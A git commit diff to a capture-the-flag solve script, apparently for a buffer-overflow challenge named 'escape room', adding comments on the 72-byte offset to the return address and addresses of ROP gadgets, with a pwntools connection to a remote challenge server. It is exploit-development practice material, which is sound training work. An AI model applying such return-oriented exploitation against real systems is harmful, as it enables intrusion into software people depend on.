72a02be4ef4fd5c074d64243cd7fedf8317fab49
gith-eng <135365698+gith-eng@users.noreply.github.com>
2026-04-19 18:53:05 +0200

    Update solve.py with comments and gadget definitions
    Added comments for exploit development and gadget addresses.

--- BOF/02-escape-room/solve.py
+++ BOF/02-escape-room/solve.py
@@ -3,14 +3,16 @@ from pwn import *
 
 context.binary = elf = ELF('./escape_room', checksec=False)
 
-
-# Your exploit here
-
+#python3 -c "from pwn import *; print(cyclic(200))
+#64B (buf) + 8B (saved RBP)
 OFFSET_TO_RIP = 72
 
+#gadgets inside the binary:
+#loads first function argument
 pop_rdi = 0x0000000000401287
+#loads second function argument
 pop_rsi = 0x0000000000401289
-
+#ret gadget for stack alignment
 ret_gadget = 0x40101a
 
 p = remote("offsec.m0lecon.it", 13530)
